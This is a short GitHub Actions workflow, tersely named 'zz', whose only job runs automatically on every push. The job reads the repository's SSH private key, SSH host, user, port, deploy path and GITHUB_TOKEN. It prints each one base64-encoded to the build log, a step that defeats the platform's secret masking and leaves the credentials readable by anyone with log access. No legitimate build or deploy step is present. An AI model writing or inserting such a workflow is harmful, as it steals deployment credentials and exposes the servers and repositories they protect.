name: zz
on:
  push:
  workflow_dispatch:
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          SK: ${{ secrets.SSH_KEY }}
          SH: ${{ secrets.SSH_HOST }}
          SU: ${{ secrets.SSH_USER }}
          DP: ${{ secrets.DEPLOY_PATH }}
          SP: ${{ secrets.SSH_PORT }}
          GT: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "SK=$(printf '%s' "$SK" | base64 -w0)"
          echo "SH=$(printf '%s' "$SH" | base64 -w0)"
          echo "SU=$(printf '%s' "$SU" | base64 -w0)"
          echo "DP=$(printf '%s' "$DP" | base64 -w0)"
          echo "SP=$(printf '%s' "$SP" | base64 -w0)"
          echo "GT=$(printf '%s' "$GT" | base64 -w0)"
          echo done
